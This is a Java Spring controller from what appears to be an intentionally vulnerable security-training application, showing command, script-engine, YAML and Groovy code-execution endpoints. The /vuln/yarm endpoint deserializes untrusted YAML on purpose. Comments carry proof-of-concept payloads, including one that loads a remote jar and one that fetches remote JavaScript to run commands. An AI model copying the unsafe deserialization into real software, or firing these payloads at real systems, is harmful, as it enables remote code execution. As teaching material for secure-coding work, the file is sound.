package org.joychou.controller;

import groovy.lang.GroovyShell;
import lombok.extern.slf4j.Slf4j;
import org.codehaus.groovy.ast.expr.BinaryExpression;
import org.codehaus.groovy.ast.expr.ConstantExpression;
import org.codehaus.groovy.ast.expr.Expression;
import org.codehaus.groovy.ast.stmt.BlockStatement;
import org.codehaus.groovy.ast.stmt.ExpressionStatement;
import org.codehaus.groovy.ast.stmt.ReturnStatement;
import org.codehaus.groovy.ast.stmt.Statement;
import org.codehaus.groovy.control.CompilerConfiguration;
import org.codehaus.groovy.control.customizers.SecureASTCustomizer;
import org.codehaus.groovy.syntax.Types;
import org.joychou.security.SecurityUtil;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;
import org.yaml.snakeyaml.Yaml;
import org.yaml.snakeyaml.constructor.SafeConstructor;

import javax.script.Bindings;
import javax.script.ScriptContext;
import javax.script.ScriptEngine;
import javax.script.ScriptEngineManager;
import java.io.BufferedInputStream;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.sql.DriverManager;
import java.util.ArrayList;
import java.util.Arrays;


/**
 * Java code execute
 *
 * @author JoyChou @ 2018-05-24
 */
@Slf4j
@RestController
@RequestMapping("/rce")
public class Rce {

    @GetMapping("/runtime/exec")
    public String CommandExec(String cmd) {
        StringBuilder sb = new StringBuilder();

        // Allowlisted command + validated args; argv array, no shell.
        String[] argv = SecurityUtil.cmdArgv(cmd);
        if (argv == null) {
            return "Bad boy. I got u.";
        }

        try {
            Process p = new ProcessBuilder(argv).redirectErrorStream(true).start();
            BufferedInputStream in = new BufferedInputStream(p.getInputStream());
            BufferedReader inBr = new BufferedReader(new InputStreamReader(in));
            String tmpStr;

            while ((tmpStr = inBr.readLine()) != null) {
                sb.append(tmpStr);
            }

            if (p.waitFor() != 0) {
                if (p.exitValue() == 1)
                    return "Command exec failed!!";
            }

            inBr.close();
            in.close();
        } catch (Exception e) {
            return e.toString();
        }
        return sb.toString();
    }


    /**
     * <a href="http://localhost:8080/rce/ProcessBuilder?cmd=whoami">POC</a>
     */
    @GetMapping("/ProcessBuilder")
    public String processBuilder(String cmd) {

        StringBuilder sb = new StringBuilder();

        // Allowlisted command + validated args; argv array, no shell.
        String[] arrCmd = SecurityUtil.cmdArgv(cmd);
        if (arrCmd == null) {
            return "Bad boy. I got u.";
        }

        try {
            ProcessBuilder processBuilder = new ProcessBuilder(arrCmd);
            Process p = processBuilder.start();
            BufferedInputStream in = new BufferedInputStream(p.getInputStream());
            BufferedReader inBr = new BufferedReader(new InputStreamReader(in));
            String tmpStr;

            while ((tmpStr = inBr.readLine()) != null) {
                sb.append(tmpStr);
            }
        } catch (Exception e) {
            return e.toString();
        }

        return sb.toString();
    }


    /**
     * http://localhost:8080/rce/jscmd?jsurl=http://xx.yy/zz.js
     *
     * curl http://xx.yy/zz.js
     * var a = mainOutput(); function mainOutput() { var x=java.lang.Runtime.getRuntime().exec("open -a Calculator");}
     *
     * @param jsurl js url
     */
    @GetMapping("/jscmd")
    public void jsEngine(String jsurl) throws Exception{
        // Only load scripts from allowlisted domains, and never let the URL break out of the string literal.
        if (SecurityUtil.checkURL(jsurl) == null || jsurl.matches(".*[\"'\\\\\\s();].*")) {
            throw new IllegalArgumentException("illegal jsurl");
        }
        // js nashorn javascript ecmascript
        ScriptEngine engine = new ScriptEngineManager().getEngineByName("js");
        Bindings bindings = engine.getBindings(ScriptContext.ENGINE_SCOPE);
        String cmd = String.format("load(\"%s\")", jsurl);
        engine.eval(cmd, bindings);
    }


    /**
     * http://localhost:8080/rce/vuln/yarm?content=!!javax.script.ScriptEngineManager%20[!!java.net.URLClassLoader%20[[!!java.net.URL%20[%22http://test.joychou.org:8086/yaml-payload.jar%22]]]]
     * yaml-payload.jar: https://github.com/artsploit/yaml-payload
     *
     * @param content payloads
     */
    @GetMapping("/vuln/yarm")
    public void yarm(String content) {
        Yaml y = new Yaml();
        y.load(content);
    }

    @GetMapping("/sec/yarm")
    public void secYarm(String content) {
        Yaml y = new Yaml(new SafeConstructor());
        y.load(content);
    }

    /**
     * http://localhost:8080/rce/groovy?content="open -a Calculator".execute()
     * @param content groovy shell
     */
    @GetMapping("groovy")
    public void groovyshell(String content) {
        // Only constant arithmetic is accepted: no method calls, property access, imports, closures,
        // assignments or class references, so the script cannot reach Runtime/ProcessBuilder/etc.
        SecureASTCustomizer customizer = new SecureASTCustomizer();
        customizer.setClosuresAllowed(false);
        customizer.setPackageAllowed(false);
        customizer.setIndirectImportCheckEnabled(true);
        customizer.setImportsWhitelist(new ArrayList<String>());
        customizer.setStarImportsWhitelist(new ArrayList<String>());
        customizer.setStaticImportsWhitelist(new ArrayList<String>());
        customizer.setStaticStarImportsWhitelist(new ArrayList<String>());
        customizer.setStatementsWhitelist(Arrays.<Class<? extends Statement>>asList(
                BlockStatement.class, ExpressionStatement.class, ReturnStatement.class));
        customizer.setExpressionsWhitelist(Arrays.<Class<? extends Expression>>asList(
                ConstantExpression.class, BinaryExpression.class));
        customizer.setTokensWhitelist(Arrays.asList(
                Types.PLUS, Types.MINUS, Types.MULTIPLY, Types.DIVIDE));
        CompilerConfiguration config = new CompilerConfiguration();
        config.addCompilationCustomizers(customizer);
        GroovyShell groovyShell = new GroovyShell(config);
        groovyShell.evaluate(content);
    }



    public static void main(String[] args) throws Exception{
        Runtime.getRuntime().exec("touch /tmp/x");
    }
}

